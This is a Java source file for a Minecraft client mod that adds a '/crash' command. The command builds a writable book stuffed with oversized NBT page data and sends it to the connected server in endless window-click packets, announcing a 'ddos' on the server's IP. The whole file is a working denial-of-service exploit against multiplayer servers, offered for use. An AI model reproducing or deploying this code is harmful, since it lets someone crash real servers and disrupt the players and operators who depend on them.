package dev.exploit.commands;

import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.text.TextComponentString;

import java.util.Objects;

public class CrashCommand extends CommandBase {
    public Minecraft mc = Minecraft.getMinecraft();

    @Override
    public String getName() {
        return "crash";
    }

    @Override
    public String getUsage(ICommandSender sender) {
        return "";
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 0;
    }

    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) {
        new Thread(() -> {
            try {
                if (!mc.isSingleplayer())
                    sendMessage(String.format("Starting ddos on %s", Objects.requireNonNull(mc.getCurrentServerData()).serverIP));
                ItemStack book1 = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list1 = new NBTTagList();
                NBTTagCompound tag1 = new NBTTagCompound();
                String size1 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 " +
                        "h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o," +
                        "978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5" +
                        "t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb54" +
                        "3yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978" +
                        "iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv4" +
                        "3vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                for (int i = 0; i < 50; i++) {
                    NBTTagString tString = new NBTTagString(size1);
                    list1.appendTag(tString);
                }
                tag1.setString("author", "abcdefgh1");
                tag1.setString("title", "i agreeeeeeeeeeeee");
                tag1.setTag("pages", list1);
                book1.setTagInfo("pages", list1);
                book1.setTagCompound(tag1);

                while (true) {
                    mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0,
                            ClickType.PICKUP, book1, (short) 0));
                    Thread.sleep(21);
                    mc.player.connection.sendPacket(new CPacketClickWindow(0, 0, 0,
                            ClickType.PICKUP, book1, (short) 0));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void sendMessage(String message) {
        Minecraft.getMinecraft().player.sendMessage(new TextComponentString(message));
    }
}
